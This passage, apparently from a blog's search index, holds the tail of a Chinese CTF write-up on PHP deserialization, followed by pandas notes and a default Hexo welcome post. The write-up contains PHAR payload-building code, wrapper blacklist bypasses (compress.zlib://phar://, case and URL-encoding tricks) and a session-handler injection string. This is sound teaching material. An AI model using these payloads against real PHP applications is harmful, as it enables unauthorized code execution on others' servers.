__HALT_COMPILER(); ?&gt;&quot;</span>);  <span class="comment">//设置存根 ：以 GIF89a（假图片标题）+ __HALT_COMPILER(); 开头，绕过上传过滤器。</span></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">TestObject</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将其存储在元数据中</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//至少添加一个文件条目</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();  <span class="comment">//最终确定</span></span><br></pre></td></tr></table></figure><hr><p>由于题目原因可能要先自行创立一个upload文件夹</p><h2 id="12-PHAR"><a href="#12-PHAR" class="headerlink" title="12 PHAR"></a>12 PHAR</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$black_list</span>=[<span class="string">&#x27;php&#x27;</span>,<span class="string">&#x27;file&#x27;</span>,<span class="string">&#x27;glob&#x27;</span>,<span class="string">&#x27;data&#x27;</span>,<span class="string">&#x27;http&#x27;</span>,<span class="string">&#x27;ftp&#x27;</span>,<span class="string">&#x27;zip&#x27;</span>,<span class="string">&#x27;https&#x27;</span>,<span class="string">&#x27;ftps&#x27;</span>,<span class="string">&#x27;phar&#x27;</span>];</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$black_list</span> <span class="keyword">as</span> <span class="variable">$item</span>)&#123;</span><br><span class="line">    <span class="variable">$front</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$filename</span>,<span class="number">0</span>,<span class="title function_ invoke__">strlen</span>(<span class="variable">$item</span>));</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$front</span>==<span class="variable">$item</span>)&#123;</span><br><span class="line">        <span class="variable">$boo1</span>=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目同上，并强制要求字符串开头不能是相应字符</p><h3 id="解法一-大小写绕过"><a href="#解法一-大小写绕过" class="headerlink" title="解法一 大小写绕过"></a>解法一 大小写绕过</h3><h3 id="解法二-compress-zlib"><a href="#解法二-compress-zlib" class="headerlink" title="解法二 compress.zlib://"></a>解法二 <code>compress.zlib://</code></h3><h4 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a><strong>1. 基本概念</strong></h4><p><code>compress.zlib://</code> 是 PHP 内置的 <strong>流包装器</strong>，用于在读写文件时 <strong>自动进行 zlib（DEFLATE）压缩或解压</strong>。</p><p>它可以让你在文件函数中（<code>fopen()</code>, <code>file_get_contents()</code>, <code>md5_file()</code> 等）直接操作压缩内容，而不需要手动调用 <code>gzcompress()</code> &#x2F; <code>gzuncompress()</code>。</p><hr><h4 id="2-基本语法"><a href="#2-基本语法" class="headerlink" title="2. 基本语法"></a><strong>2. 基本语法</strong></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//&lt;实际文件路径&gt;</span></span><br></pre></td></tr></table></figure><p>或：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//&lt;其它流包装器路径&gt;</span></span><br></pre></td></tr></table></figure><p><strong>解释：</strong></p><ul><li><code>compress.zlib://</code> 是外层包装器。</li><li><code>&lt;实际文件路径&gt;</code> 可以是本地文件，也可以是另一个流包装器（例如 <code>phar://</code>）。</li></ul><hr><h4 id="3-常见用途"><a href="#3-常见用途" class="headerlink" title="3. 常见用途"></a><strong>3. 常见用途</strong></h4><h5 id="1-读取-gzip-压缩的文件"><a href="#1-读取-gzip-压缩的文件" class="headerlink" title="(1) 读取 gzip 压缩的文件"></a><strong>(1) 读取 gzip 压缩的文件</strong></h5><p>假设有个 <code>data.txt.gz</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;compress.zlib://data.txt.gz&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$content</span>; <span class="comment">// 自动解压后输出原文</span></span><br></pre></td></tr></table></figure><p>相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">gzdecode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;data.txt.gz&quot;</span>));</span><br></pre></td></tr></table></figure><hr><h5 id="2-写入时自动压缩"><a href="#2-写入时自动压缩" class="headerlink" title="(2) 写入时自动压缩"></a><strong>(2) 写入时自动压缩</strong></h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;compress.zlib://data.txt.gz&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line"><span class="comment">// 结果：data.txt.gz 是压缩过的</span></span><br></pre></td></tr></table></figure><hr><h5 id="3-与其他包装器嵌套"><a href="#3-与其他包装器嵌套" class="headerlink" title="(3) 与其他包装器嵌套"></a><strong>(3) 与其他包装器嵌套</strong></h5><p><code>compress.zlib://</code> 可以包裹另一个流包装器，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib:<span class="comment">//phar://upload/payload.phar/test.txt</span></span><br></pre></td></tr></table></figure><p>这会先通过 <code>phar://</code> 打开 <code>upload/payload.phar</code> 里的 <code>test.txt</code>，然后<strong>把内容交给 zlib 解压</strong>。</p><hr><h4 id="4-在-PHAR-反序列化中的作用"><a href="#4-在-PHAR-反序列化中的作用" class="headerlink" title="4. 在 PHAR 反序列化中的作用"></a><strong>4. 在 PHAR 反序列化中的作用</strong></h4><p>在 PHAR 反序列化利用中，<code>compress.zlib://</code> 常用于 <strong>绕过过滤</strong>：</p><ul><li>一些 WAF 或代码只检测参数里有没有 <code>phar://</code> 开头的路径。</li><li>通过 <code>compress.zlib://phar://...</code>，<code>phar://</code> 就不在最前面，可能逃过检查。</li><li>但是 <strong>PHP 内部依然会调用 PHAR 解析器</strong>，照样会去读取 PHAR 的 metadata → 触发 unserialize → 执行恶意 <code>__destruct()</code> &#x2F; <code>__wakeup()</code>。</li></ul><p><strong>重要细节：</strong></p><ul><li><p>必须写上 <strong>内部文件路径</strong>，否则 PHAR 打不开：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">✅ compress.zlib://phar://upload/payload.png/test.txt</span><br><span class="line">❌ compress.zlib://phar://upload/payload.png  // 会报错</span><br></pre></td></tr></table></figure></li><li><p>即使解压失败（因为文件没压缩过），<strong>PHAR 元数据的反序列化在解压前就发生</strong>，所以 payload 一样能触发。</p></li><li><p>如果想让 zlib 层正常解压，可以在生成 PHAR 时压缩 entry：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">compressFiles</span>(<span class="title class_">Phar</span>::<span class="variable constant_">GZ</span>); <span class="comment">// 压缩所有文件</span></span><br></pre></td></tr></table></figure></li></ul><hr><h4 id="5-常见安全利用场景"><a href="#5-常见安全利用场景" class="headerlink" title="5. 常见安全利用场景"></a><strong>5. 常见安全利用场景</strong></h4><ol><li><p><strong>过滤绕过</strong></p><ul><li><p>过滤 <code>phar://</code> → 用 <code>compress.zlib://phar://</code>。</p></li><li><p>结合大小写、URL 编码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">compress.zlib://pHaR://...</span><br><span class="line">compress.zlib://%70har://...</span><br></pre></td></tr></table></figure></li></ul></li><li><p><strong>混淆流路径</strong></p><ul><li>安全人员查日志时可能忽略这种“多层”包装器，攻击链隐藏性更高。</li></ul></li><li><p><strong>兼容性利用</strong></p><ul><li>某些老版本 PHP 解析器在处理多层包装器时会走不同代码路径，可能绕过 <code>allow_url_fopen</code> 或文件路径校验。</li></ul></li></ol><hr><h4 id="6-流程图（compress-zlib-phar-）"><a href="#6-流程图（compress-zlib-phar-）" class="headerlink" title="6. 流程图（compress.zlib://phar://）"></a><strong>6. 流程图（<code>compress.zlib://phar://</code>）</strong></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">md5_file(&quot;compress.zlib://phar://upload/payload.png/test.txt&quot;)</span><br><span class="line">       │</span><br><span class="line">       ▼</span><br><span class="line">compress.zlib wrapper 打开 inner stream</span><br><span class="line">       │</span><br><span class="line">       ▼</span><br><span class="line">phar:// wrapper 被调用 → 解析 PHAR manifest</span><br><span class="line">       │</span><br><span class="line">       ▼</span><br><span class="line">反序列化 metadata（恶意对象创建）</span><br><span class="line">       │</span><br><span class="line">       ▼</span><br><span class="line">后续尝试读取内部文件 → 交给 zlib 解压</span><br></pre></td></tr></table></figure><p><strong>关键点：反序列化在解压之前发生</strong>，所以即使解压失败，payload 依然执行。</p><hr><h4 id="7-小结"><a href="#7-小结" class="headerlink" title="7. 小结"></a><strong>7. 小结</strong></h4><ul><li><code>compress.zlib://</code> 是 PHP 的压缩流包装器，可以读写 gzip&#x2F;zlib 格式。</li><li>可以与 <code>phar://</code> 嵌套，用于 PHAR 反序列化漏洞的绕过和混淆。</li><li>触发反序列化的关键在于 <strong>PHAR wrapper 会在访问内部 entry 前解析元数据</strong>，与 zlib 是否解压成功无关。</li></ul><h2 id="13-session"><a href="#13-session" class="headerlink" title="13 session"></a>13 session</h2><p>PHP 希望会话文件采用以下格式：</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">varname</span>&gt;</span>|<span class="tag">&lt;<span class="name">serialized_value</span>&gt;</span><span class="tag">&lt;<span class="name">next_var</span>&gt;</span>|<span class="tag">&lt;<span class="name">serialized_value</span>&gt;</span>...</span></span><br></pre></td></tr></table></figure><p>在<code>hint.php</code>中</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;a&#x27;</span>] = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];   <span class="comment">// you control this string</span></span><br></pre></td></tr></table></figure><p>发送</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=|O:4:&quot;Flag&quot;:2:&#123;s:4:&quot;name&quot;;N;s:3:&quot;her&quot;;R:2;&#125;</span><br></pre></td></tr></table></figure><p>你注入的字符串以 <code>|</code> 开头 ，所以 <code>php</code> 处理程序会发现 | 并将之后的所有内容视为序列化值。该“值”以 O：4：“Flag”… 开头，因此 PHP 取消序列化您的对象 ，触发<code>__wakeup()</code>。</p><h2 id="14"><a href="#14" class="headerlink" title="14"></a>14</h2>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pandas 基础</title>
      <link href="/2025/07/26/pandas/"/>
      <url>/2025/07/26/pandas/</url>
      
        <content type="html"><![CDATA[<h1 id="pandas-2-Pandas-I-from-Spring-2025-–-Principles-and-Techniques-of-Data-Science"><a href="#pandas-2-Pandas-I-from-Spring-2025-–-Principles-and-Techniques-of-Data-Science" class="headerlink" title="pandas [[2  Pandas I (from Spring 2025) – Principles and Techniques of Data Science]]"></a>pandas [[2  Pandas I (from Spring 2025) – Principles and Techniques of Data Science]]</h1><h2 id="how-datas-are-organized"><a href="#how-datas-are-organized" class="headerlink" title="how datas are organized"></a>how datas are organized</h2><p>see table as DataFrame, and each column as a Series</p><h3 id="Series"><a href="#Series" class="headerlink" title="Series"></a>Series</h3><ul><li>a sequence of values of same type</li><li>a sequence of data labels called index</li></ul><h4 id="Selection-in-Series"><a href="#Selection-in-Series" class="headerlink" title="Selection in Series"></a>Selection in Series</h4><ul><li>by a single label or a list of labels: <code>s[[labels]]</code></li><li>by a filtering condition: <code>s[s &gt; 0]</code></li></ul><h3 id="DataFrame"><a href="#DataFrame" class="headerlink" title="DataFrame"></a>DataFrame</h3><h4 id="where-the-data-of-DataFrame-comes-from"><a href="#where-the-data-of-DataFrame-comes-from" class="headerlink" title="where the data of DataFrame comes from"></a>where the data of DataFrame comes from</h4><ul><li>csv file: <code>pd.read_csv(&#39;file.csv&#39;, index_col = &#39;year&#39;)</code></li><li>using a list: <code>pd.DataFrame([[1, 2], [3, 4]], columns=[&#39;A&#39;, &#39;B&#39;], index=[&#39;a&#39;, &#39;b&#39;])</code></li><li>using a dictionary: <code>pd.DataFrame(&#123;&#39;A&#39;: [1, 2], &#39;B&#39;: [3, 4]&#125;, index=[&#39;a&#39;, &#39;b&#39;])</code></li><li>using a Series:</li></ul><h4 id="about-index"><a href="#about-index" class="headerlink" title="about index"></a>about index</h4><ul><li>index can also have a name</li><li>do not have to be unique</li><li>These indices are the arbitrary numerical indices generated when we created the <code>DataFrame</code>. For example, <code>banana</code> was originally in row 2, and so it has row label 2. Note the distinction between the index <code>_label_</code>, and the actual index <code>_position_</code>.</li><li>can be set to specific column using <code>df.set_index(&lt;column&gt;)</code></li><li>can be reset to default using <code>df.reset_index()</code></li></ul><h4 id="DataFrame-API"><a href="#DataFrame-API" class="headerlink" title="DataFrame API"></a>DataFrame API</h4><p><a href="**%5Bhttps://pandas.pydata.org/docs/reference/api/pandas.DataFrame.html%5D(https://pandas.pydata.org/docs/reference/api/pandas.DataFrame.html)**">API doc</a></p><ul><li><code>idxmax()</code> function returns the index of the first occurrence of the maximum value in a Series or DataFrame.</li><li><code>drop_duplicates()</code> function removes duplicate rows from a DataFrame.</li></ul><h4 id="Data-extraction"><a href="#Data-extraction" class="headerlink" title="Data extraction"></a>Data extraction</h4><ul><li><code>df.head(&lt;n&gt;)</code></li><li><code>df.tail(&lt;n&gt;)</code></li><li><code>df.loc[&lt;row_index&gt;, &lt;column_name&gt;]</code><ul><li>Note that if we request a single column but don’t enclose it in a list, the return type of the <code>loc</code> operator is a <code>Series</code> rather than a <code>DataFrame</code></li><li><strong>reminder: a:b means [a,b]</strong></li></ul></li><li><code>df.iloc[&lt;row_integers&gt;, &lt;column_integers&gt;]</code></li><li><code>[]</code><ul><li>a slice of rows: <code>df[&lt;row_slice&gt;]</code></li><li>a list of column labels</li><li>a single column label</li><li><strong>reminder: a:b means [a,b)</strong></li><li>Note that slicing notation is not supported for columns if you use <code>[]</code> notation. Use <code>loc</code> instead.</li></ul></li></ul><h5 id="Boolean-Array-Input"><a href="#Boolean-Array-Input" class="headerlink" title="Boolean Array Input"></a>Boolean Array Input</h5><ul><li><code>.loc</code> and <code>[]</code> can take a boolean array as input</li></ul><h5 id="Boolean-choose"><a href="#Boolean-choose" class="headerlink" title="Boolean choose"></a>Boolean choose</h5><ul><li><code>df[df[&#39;column&#39;] &gt; 0]</code> returns rows where the value in ‘column’ is greater than 0</li><li><code>df[df[&#39;column&#39;].isin([1, 2, 3])]</code> returns rows where the value in ‘column’ is in the list <code>[1, 2, 3]</code></li><li><code>df[df[&#39;column&#39;].str.contains(&#39;pattern&#39;)]</code> returns rows where the value in ‘column’ contains the substring ‘pattern’</li></ul><h4 id="operations-on-DataFrame"><a href="#operations-on-DataFrame" class="headerlink" title="operations on DataFrame"></a>operations on DataFrame</h4><h5 id="add-modify-columns"><a href="#add-modify-columns" class="headerlink" title="add&#x2F;modify columns"></a>add&#x2F;modify columns</h5><ul><li>using <code>[]</code> to add a new column: <code>df[&#39;new_column&#39;] = [1, 2, 3]</code></li></ul><h5 id="rename-columns"><a href="#rename-columns" class="headerlink" title="rename columns"></a>rename columns</h5><ul><li>using <code>rename</code>: <code>df.rename(columns=&#123;&#39;old_name&#39;: &#39;new_name&#39;&#125;, inplace=True)</code></li></ul><h5 id="delete-columns"><a href="#delete-columns" class="headerlink" title="delete columns"></a>delete columns</h5><ul><li>using <code>drop</code>: <code>df.drop(columns=[&#39;column_to_delete&#39;], inplace=True)</code><ul><li>By default, <code>drop</code> does not modify the DataFrame in place, so you need to set <code>inplace=True</code> to apply the changes directly to the original DataFrame, or just assign the result to a new variable.</li></ul></li></ul><h4 id="useful-methods"><a href="#useful-methods" class="headerlink" title="useful methods"></a>useful methods</h4><ul><li>suport a range of methods from <code>numpy</code>, as long as the type is int.</li><li><code>size/shape</code></li><li><code>describe</code>: return a description of DataFrame</li><li><code>sample</code>: randomly select rows, replace can be set</li><li><code>value_counts</code>: return counts of unique values</li><li><code>sort_values</code>: sort by column values</li><li><code>unique</code>: return unique values</li></ul><h4 id="Group"><a href="#Group" class="headerlink" title="Group"></a>Group</h4><h5 id="Goal"><a href="#Goal" class="headerlink" title="Goal"></a>Goal</h5><p>Group data by one or more columns and perform aggregate operations on the grouped data.</p><h5 id="GroupBy"><a href="#GroupBy" class="headerlink" title="GroupBy"></a>GroupBy</h5><p>groupby generates a GroupBy object</p><p>we can’t work with GroupBy object directly, we need to apply an aggregation function(to reduce the dimension of table)(a function that aggregates several values into one summary value) to it.<br><code>grouped = df.groupby(&#39;column_name&#39;).agg(&#123;&#39;other_column&#39;: &#39;sum&#39;&#125;)</code></p><p>the column we grouped on will become the index</p><h6 id="Filtering-by-Group"><a href="#Filtering-by-Group" class="headerlink" title="Filtering by Group"></a><strong>Filtering by Group</strong></h6><p>it takes a function that returns true or false for each sub-DataFrame, where <code>True</code> means the group should be kept.</p><h6 id="look-into-DataFrame-groupby-ways"><a href="#look-into-DataFrame-groupby-ways" class="headerlink" title="look into DataFrame.groupby ways"></a><strong>look into DataFrame.groupby ways</strong></h6><p><code>grouped.groups()</code><br><code>grouped.get_group(&#39;group_name&#39;)</code></p><h6 id="Grouping-by-Multiple-Columns"><a href="#Grouping-by-Multiple-Columns" class="headerlink" title="Grouping by Multiple Columns"></a><strong>Grouping by Multiple Columns</strong></h6><ol><li>using a list of column names: <code>df.groupby([&#39;col1&#39;, &#39;col2&#39;])</code></li><li>using Pivot Table</li></ol><ul><li><code>index</code>: the column(s) to group by</li><li><code>columns</code>: the column(s) to pivot</li><li><code>values</code>: the column(s) to aggregate</li><li><code>aggfunc</code>: the aggregation function to apply</li></ul><h4 id="Joining-DataFrames"><a href="#Joining-DataFrames" class="headerlink" title="Joining DataFrames"></a>Joining DataFrames</h4>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> data_science </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2025/07/25/hello-world/"/>
      <url>/2025/07/25/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
